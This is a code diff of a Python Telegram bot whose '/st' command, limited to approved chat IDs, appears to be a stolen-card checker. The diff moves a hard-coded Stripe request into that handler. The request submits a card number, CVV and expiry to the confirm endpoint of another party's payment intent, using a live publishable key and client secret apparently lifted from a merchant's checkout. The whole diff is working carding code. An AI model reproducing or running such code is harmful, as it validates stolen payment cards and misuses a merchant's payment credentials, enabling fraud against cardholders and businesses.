@@ -211,30 +211,6 @@ def snd_welcome ( message ) :
              y = "contact @N2k4n for allwed you"
              bot.reply_to ( message , y )
 
-cc,ye,mth,cvv='0','0','0','0'
- 
-data={
-    'payment_method_data[type]':'card',
-    'payment_method_data[billing_details][name]':'Nihf kn',
-    'payment_method_data[card][number]':cc,
-    'payment_method_data[card][cvc]':cvv,
-    'payment_method_data[card][exp_month]':mth,
-    'payment_method_data[card][exp_year]':ye,
-    'payment_method_data[guid]': 'ca62c621-8dfd-4344-aa27-f2564ccf36460a6ae6',
-    'payment_method_data[muid]': '49b2ccf6-2a11-4f95-82c0-112520e240fa1b4600',
-    'payment_method_data[sid]': 'b4016138-37ca-430c-952c-e055cef2ea961f1a46',
-    'payment_method_data[payment_user_agent]': 'stripe.js/c6f2aaa66; stripe-js-v3/c6f2aaa66',
-    'payment_method_data[time_on_page]': 48787,
-    'expected_payment_method_type': 'card',
-    'use_stripe_sdk': 'true',
-    'webauthn_uvpa_available': 'false',
-    'spc_eligible': 'false',
-    'key': 'pk_live_51DJpRVFgrf8fsEG4rtqF6ifpKNLShxgXcQb8qeHFa9MkVw2LByShB4k4xeoKeBFLQ9FiIsFpAabZxUf9zqCD8VEs00hqtoFyUg',
-    'client_secret': 'pi_3K3nzkFgrf8fsEG40o8bSvRJ_secret_coKVEZEgejvjV3tUFe5V1uLLd',
-}
-headers={
-    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
-}
 @bot.message_handler ( commands=['st'] )
 def snd_welcome ( message ) :
     ccu = message.text
@@ -269,6 +245,28 @@ def snd_welcome ( message ) :
             x = str ( message.chat.id )
             if x in li :
                 url2='https://api.stripe.com/v1/payment_intents/pi_3K3nzkFgrf8fsEG40o8bSvRJ/confirm'
+                data={
+    'payment_method_data[type]':'card',
+    'payment_method_data[billing_details][name]':'Nihf kn',
+    'payment_method_data[card][number]':cc,
+    'payment_method_data[card][cvc]':cvv,
+    'payment_method_data[card][exp_month]':mth,
+    'payment_method_data[card][exp_year]':ye,
+    'payment_method_data[guid]': 'ca62c621-8dfd-4344-aa27-f2564ccf36460a6ae6',
+    'payment_method_data[muid]': '49b2ccf6-2a11-4f95-82c0-112520e240fa1b4600',
+    'payment_method_data[sid]': 'b4016138-37ca-430c-952c-e055cef2ea961f1a46',
+    'payment_method_data[payment_user_agent]': 'stripe.js/c6f2aaa66; stripe-js-v3/c6f2aaa66',
+    'payment_method_data[time_on_page]': 48787,
+    'expected_payment_method_type': 'card',
+    'use_stripe_sdk': 'true',
+    'webauthn_uvpa_available': 'false',
+    'spc_eligible': 'false',
+    'key': 'pk_live_51DJpRVFgrf8fsEG4rtqF6ifpKNLShxgXcQb8qeHFa9MkVw2LByShB4k4xeoKeBFLQ9FiIsFpAabZxUf9zqCD8VEs00hqtoFyUg',
+    'client_secret': 'pi_3K3nzkFgrf8fsEG40o8bSvRJ_secret_coKVEZEgejvjV3tUFe5V1uLLd',
+}
+                headers={
+    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
+}
                 bot.reply_to ( message , "-----please W8 ----- " )
                 rr = requests.post(url2,data=data,headers=headers)
                 get=rr.text
